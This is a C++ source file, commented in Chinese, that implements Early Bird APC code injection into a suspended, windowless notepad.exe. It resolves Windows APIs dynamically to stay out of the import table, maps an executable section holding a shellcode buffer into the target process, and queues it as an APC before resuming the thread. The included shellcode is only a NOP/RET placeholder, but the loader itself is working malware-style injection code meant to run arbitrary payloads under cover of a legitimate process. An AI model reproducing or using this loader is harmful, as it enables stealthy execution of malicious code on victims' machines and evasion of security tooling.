#include <windows.h>
#include <iostream>
#include "safeApi.h"
#include "safeToolhelp.h"

// shellcode 示例
unsigned char shellcode[] = {0x90, 0x90, 0x90, 0xC3}; // NOP NOP NOP RET

typedef HANDLE (WINAPI *PFN_CreateFileMappingW)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCWSTR);
typedef LPVOID (WINAPI *PFN_MapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef LPVOID (WINAPI *PFN_MapViewOfFile2)(HANDLE, HANDLE, ULONG64, PVOID, SIZE_T, ULONG64, ULONG, DWORD);
typedef BOOL (WINAPI *PFN_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef DWORD (WINAPI *PFN_QueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
typedef DWORD (WINAPI *PFN_ResumeThread)(HANDLE);
typedef BOOL (WINAPI *PFN_CloseHandle)(HANDLE);
typedef BOOL (WINAPI *PFN_UnmapViewOfFile)(LPCVOID);
typedef void* (*PFN_memcpy)(void*, const void*, size_t);

int main() {
    // 1. 动态获取API地址
    PFN_CreateFileMappingW pCreateFileMappingW = (PFN_CreateFileMappingW)SafeGetProcAddress(L"kernel32.dll", "CreateFileMappingW");
    PFN_MapViewOfFile pMapViewOfFile = (PFN_MapViewOfFile)SafeGetProcAddress(L"kernel32.dll", "MapViewOfFile");
    PFN_MapViewOfFile2 pMapViewOfFile2 = (PFN_MapViewOfFile2)SafeGetProcAddress(L"kernel32.dll", "MapViewOfFile2");
    PFN_CreateProcessW pCreateProcessW = (PFN_CreateProcessW)SafeGetProcAddress(L"kernel32.dll", "CreateProcessW");
    PFN_QueueUserAPC pQueueUserAPC = (PFN_QueueUserAPC)SafeGetProcAddress(L"kernel32.dll", "QueueUserAPC");
    PFN_ResumeThread pResumeThread = (PFN_ResumeThread)SafeGetProcAddress(L"kernel32.dll", "ResumeThread");
    PFN_CloseHandle pCloseHandle = (PFN_CloseHandle)SafeGetProcAddress(L"kernel32.dll", "CloseHandle");
    PFN_UnmapViewOfFile pUnmapViewOfFile = (PFN_UnmapViewOfFile)SafeGetProcAddress(L"kernel32.dll", "UnmapViewOfFile");
    PFN_memcpy pMemcpy = memcpy;

    if (!pCreateFileMappingW || !pMapViewOfFile || !pMapViewOfFile2 || !pCreateProcessW || !pQueueUserAPC || !pResumeThread || !pCloseHandle || !pUnmapViewOfFile) {
        std::cout << "API 获取失败" << std::endl;
        return -1;
    }

    // 2. 创建物理内存映射
    HANDLE hMapping = pCreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);
    if (!hMapping) {
        std::cout << "CreateFileMappingW 失败" << std::endl;
        return -2;
    }
    LPVOID lpMapAddress = pMapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));
    if (!lpMapAddress) {
        std::cout << "MapViewOfFile 失败" << std::endl;
        pCloseHandle(hMapping);
        return -3;
    }
    pMemcpy(lpMapAddress, shellcode, sizeof(shellcode));

    // 3. 创建目标进程（挂起）
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOW);
    BOOL bRet = pCreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!bRet) {
        std::cout << "CreateProcessW 失败" << std::endl;
        pUnmapViewOfFile(lpMapAddress);
        pCloseHandle(hMapping);
        return -4;
    }

    // 4. MapViewOfFile2 映射到远程进程
    LPVOID lpMapAddressRemote = pMapViewOfFile2(hMapping, pi.hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ, 0);
    if (!lpMapAddressRemote) {
        std::cout << "MapViewOfFile2 失败" << std::endl;
        pCloseHandle(pi.hThread);
        pCloseHandle(pi.hProcess);
        pUnmapViewOfFile(lpMapAddress);
        pCloseHandle(hMapping);
        return -5;
    }

    // 5. EarlyBird APC 注入
    DWORD apcRet = pQueueUserAPC((PAPCFUNC)lpMapAddressRemote, pi.hThread, NULL);
    if (!apcRet) {
        std::cout << "QueueUserAPC 失败" << std::endl;
        pCloseHandle(pi.hThread);
        pCloseHandle(pi.hProcess);
        pUnmapViewOfFile(lpMapAddress);
        pCloseHandle(hMapping);
        return -6;
    }
    pResumeThread(pi.hThread);

    // 6. 清理资源
    pCloseHandle(pi.hThread);
    pCloseHandle(pi.hProcess);
    pUnmapViewOfFile(lpMapAddress);
    pCloseHandle(hMapping);
    std::cout << "注入完成" << std::endl;
    return 0;
}
